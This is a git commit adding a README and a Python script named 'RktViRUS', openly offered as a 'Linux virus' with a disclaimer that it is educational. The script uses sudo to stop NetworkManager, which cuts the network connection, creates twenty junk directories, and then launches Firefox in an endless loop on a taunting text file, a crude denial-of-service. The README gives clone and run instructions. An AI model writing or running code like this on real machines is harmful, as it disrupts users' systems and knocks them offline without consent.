07afdf1225e59b9868c293578754227e93d80f6d
Rahat Khan Tusar(RKT) <69615463+r3k4t@users.noreply.github.com>
2020-12-17 19:39:49 +0530

    Add files via upload

---
+++ README.md
@@ -0,0 +1,34 @@
+
+<h2>RktViRUS</h2>
+
+<h6>Author : RKT </h6>
+
+
+Rktvirus  is a LINUX VIRUS.Its build on python program.It is a simple virus.Warning:It is an educational purpose.I am not responsible for your illegal activity.
+
+
+### Setup ###
+
+
+pip install -r requirements.txt
+
+
+### Terminal Command ###
+
+
+git clone https://github.com/r3k4t/rktvirus.git
+<br>
+cd cd rktvirus
+<br>
+python3 rktvirus.py
+
+
+### Screenshots ###
+
+
+![Screenshot_2020-12-17_19-11-42](https://user-images.githubusercontent.com/69615463/102497493-b758e980-409e-11eb-8691-a450e5e10410.png)
+
+![Screenshot_2020-12-17_15-07-30](https://user-images.githubusercontent.com/69615463/102497900-41a14d80-409f-11eb-9b1b-d0c8b00f4ede.png)
+
+
+
---
+++ rktvirus.py
@@ -0,0 +1,45 @@
+
+import os
+import sys
+import time
+import pyfiglet
+os.system("clear")
+os.system(chr(27)+"[31m")
+banner = pyfiglet.figlet_format("RktViRUS",font="big")
+print(banner)
+print(chr(27)+"[33m"+"    Author : Rahat Khan Tusar(RKT)")
+print(chr(27)+"[33m"+"    Github : https://github.com/r3k4t")
+print
+os.system(chr(27)+"[31m")
+print("YOUR SYSTEM HAS BEEN AFFECTED BY VIRUS !")
+time.sleep(2)
+print("VIRUS CAN DISCONNECT YOUR SYSTEM WIFI CONNECTION !")
+time.sleep(2) 
+os.system("sudo service NetworkManager stop")
+os.system("sudo mkdir VIRUS1")
+os.system("sudo mkdir VIRUS2")
+os.system("sudo mkdir VIRUS3")
+os.system("sudo mkdir VIRUS4")
+os.system("sudo mkdir VIRUS5")
+os.system("sudo mkdir VIRUS6")
+os.system("sudo mkdir VIRUS7")
+os.system("sudo mkdir VIRUS8")
+os.system("sudo mkdir VIRUS9")
+os.system("sudo mkdir VIRUS10")
+os.system("sudo mkdir VIRUS11")
+os.system("sudo mkdir VIRUS12")
+os.system("sudo mkdir VIRUS13")
+os.system("sudo mkdir VIRUS14")
+os.system("sudo mkdir VIRUS15")
+os.system("sudo mkdir VIRUS16")
+os.system("sudo mkdir VIRUS17")
+os.system("sudo mkdir VIRUS18")
+os.system("sudo mkdir VIRUS19")
+os.system("sudo mkdir VIRUS20")
+os.system("echo I DO NOT LIKE YOU.>virus.txt")
+while True:
+     os.system("firefox virus.txt")
+
+
+
+
